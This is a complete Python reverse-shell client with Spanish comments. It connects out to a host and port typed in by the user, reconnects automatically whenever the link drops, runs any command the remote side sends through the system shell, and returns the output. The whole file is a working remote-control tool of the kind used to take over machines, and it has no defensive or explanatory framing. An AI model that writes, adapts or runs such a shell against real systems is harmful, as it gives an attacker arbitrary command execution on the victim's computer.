import socket
import subprocess
import sys
import time

def ejecutar(cmd):
    """Ejecuta el comando y devuelve el output completo"""
    try:
        resultado = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=15
        )
        output = resultado.stdout + resultado.stderr
        return output if output.strip() else "[*] Sin output"
    except subprocess.TimeoutExpired:
        return "[!] Timeout"
    except Exception as e:
        return f"[!] Error: {str(e)}"


def conectar(host, port):
    """Reintenta la conexión hasta que el server esté disponible"""
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            print(f"[*] Conectado a {host}:{port}")
            return sock
        except:
            print("[!] Sin conexión. Reintentando en 5s...")
            time.sleep(5)


def main():
    host = input("Host: ")
    port = int(input("Port: "))

    sock = conectar(host, port)

    while True:
        try:
            data = sock.recv(4096)
            if not data:
                print("[!] Server cerrado")
                break

            cmd = data.decode("utf-8").strip()

            if cmd == "exit":
                break

            print(f"[*] Ejecutando: {cmd}")
            output = ejecutar(cmd)
            sock.sendall(output.encode("utf-8", errors="replace"))

        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[!] Conexión perdida: {e}")
            sock = conectar(host, port)  # auto-reconecta

    sock.close()


if __name__ == "__main__":
    main()